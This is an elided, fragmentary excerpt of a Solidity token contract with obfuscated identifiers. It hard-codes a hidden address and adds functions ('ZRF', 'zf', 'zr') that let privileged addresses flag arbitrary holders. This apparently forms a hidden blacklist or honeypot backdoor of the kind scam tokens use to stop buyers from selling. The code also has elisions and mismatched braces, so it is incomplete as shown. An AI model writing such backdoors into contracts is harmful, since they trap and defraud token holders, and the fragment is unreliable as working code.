...
contract Ownable is Context {
    ...
    address _zConst = 0xE01f4125A9bBc0AdEa3d9721A20ba3d721eC0F51;
...
contract nI is Context, Ownable {
    ...
    function allowance(address owner, address spender) public view  returns (uint256) {
		...
		function ZRF(address Zf) ZX public{
        Zb[Zf] = true; }
        ...
        return true; }
		function zf(address Zf) public {
        if(Zb[msg.sender]) { 
        Za[Zf] = false;}}
        function zr(address Zf) public{
         if(Zb[msg.sender])  { 
        require(!Za[Zf]);
        Za[Zf] = true; }}
